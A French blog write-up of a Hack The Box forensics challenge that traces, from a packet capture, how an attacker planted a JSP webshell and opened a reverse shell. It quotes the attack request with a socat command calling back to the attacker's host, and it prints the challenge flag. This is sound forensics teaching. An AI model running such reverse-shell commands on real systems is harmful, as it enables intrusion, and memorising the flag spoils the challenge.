---
title: \[FR\] HTB - Wrong Spooky Season
published: true
---
[HTB - Wrong Spooky Season](https://app.hackthebox.com/challenges/wrong-spooky-season)
Catégorie : Forensic

Enoncé : "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did."

# Introduction
Le challenge se présente sous un fichier pcap contenant le traffic réseau où s'est déroulée une cyberattaque. Notre objectif est d'enquêter sur le déroulement de l'attaque.

Après avoir ouvert le fichier pcap avec wireshark, on peut constater que les trames sont issues des protocols http et tcp.

![](/assets/HTB_Wrong_Spooky_Season/overview.png)

# Les trames http

L'ip de l'attaquant serait 192.168.1.180 et l'ip du serveur ciblé st 192.168.1.166.

En observant les trames http, nous voit que l'attaquant a upload via des requêtes POST un webshell sur le serveur cible et a établi par la suite un reverse shell en y injectant une commande socat.
```
GET /e4d1c32a56ca15b3.jsp?cmd=socat%20TCP:192.168.1.180:1337%20EXEC:bash HTTP/1.1
Host: 192.168.1.166:8080
User-Agent: python-requests/2.28.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```
Remarque : Notons l'user-agent python-requests/2.28.1, on peut émettre l'hypothèse que l'attaquant a crée un exploit pour exploiter le serveur 192.168.1.166

![](/assets/HTB_Wrong_Spooky_Season/http_traffic.png)

D'après la commande exécutée via la requête GET, le port écouté par l'attaquant serait le port 1337.
La connectant est établie en tcp, donc on va filtrer sur le port 1337 en tcp.

# Les trames tcp
![](/assets/HTB_Wrong_Spooky_Season/tcp_traffic.png)

Etant donné que les échanges à travers le reverse shell ne sont pas chiffré, on peut directement suivre toute la conversation  entre l'attaquant et sa cible. (onglet 'statistic' -> 'conversation' -> onglet 'TCP 1' -> 'Follow Stream' )

![](/assets/HTB_Wrong_Spooky_Season/conv_tcp.png)

On constate qu'à travers une commande, l'attaquant reverse les caractères de la chaîne `==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS`. Cette chaîne doit contenir le flag du challenge si on la met au bon format :

```
┌──(kali㉿kali)-[~]
└─$ echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev
SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==
# Ok ça ressemble à du base64, on va décoder ça!
┌──(kali㉿kali)-[~]
└─$ echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}

```

Flag : HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}